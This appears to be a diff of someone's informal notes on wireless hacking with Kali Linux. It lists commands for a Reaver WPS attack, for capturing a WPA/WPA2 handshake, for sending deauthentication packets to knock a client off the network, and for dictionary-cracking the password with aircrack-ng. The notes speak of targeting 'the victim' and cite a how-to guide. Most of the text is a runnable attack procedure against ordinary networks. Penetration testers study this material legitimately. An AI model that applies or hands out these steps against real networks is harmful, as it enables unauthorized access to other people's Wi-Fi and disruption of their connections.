@@ -1,7 +1,36 @@
-3. wireless hacking(using kali)
+1. wireless hacking(using kali)
  1) airmon-ng check kill -> this instruction kills proccess 591(wpa_supplicant)
  2) airmon-ng check -> does not show anythings.
  3) airmon-ng start wlan0
  4) airodump-ng wlan0mon
  5) copy the bssid of the victim
  6) reaver -i wlan0mon -b (target ssid) -vv -K 1
+(it doesn't work good.... when i try it)
+
+2. second way
+ 1) disconnect from all wireless network.
+	#airmon-ng -> this will list all of the wireless cards that support monitor(not injection) mode.
+
+ 2) if the card is listed in ifconfig, but doesn't show up in airmon-ng, then the card doesn't support it.
+
+ 3) Type airmon-ng start followed by the interface of your wireless card.
+	#airmon-ng start wlan0 -> (monitor mode enabled) message means that the card has successfully been put into monitor mode. Note the name of the new monitor interface, mon0 
+
+ 4) type airodump-ng followed by the name of the new monitor interface. the monitor interface is probably mon0. 
+#airodump-ng wlan0mon
+
+ 5) #airodump-ng -c [channel] --bssid [ESSID] -w /root/Desktop/ wlan0mon
+
+ 6) wait. airodump with now monitor only the target network, allowing us to capture more specific information about it. what we're really doing now waiting for a device to connect or reconnect to the network, forcing the router to send out the four-way handshake that we need to capture in order to crack the password.
+
+ 7) also, four files showld show up on your desktop; We're actually going to use another cool-tool that belongs to the aircrack suite called aireplay-ng, to speed up the process. Instead of waiting for a devices to connect, hackers use thi s tool to force a device to reconnect by sending deauthentication (deauth) packets to the device, making it think that has to reconnect with the router. of course, in order for this tool to work, there has to be someone else connected to the network first, so watch the airodump-ng and wait for a client to show up. 
+
+ 8) 
+#aireplay-ng -0 2 -a [router bssid] -c [client bssid] mon0.
+-> -0 is a short cut for the death mode and the 2 is the number of death packets to send.
+
+ 9)
+#aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+-> -a is the method aircrack will use to crack the handshake,2=WPA method.
+
+https://www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux
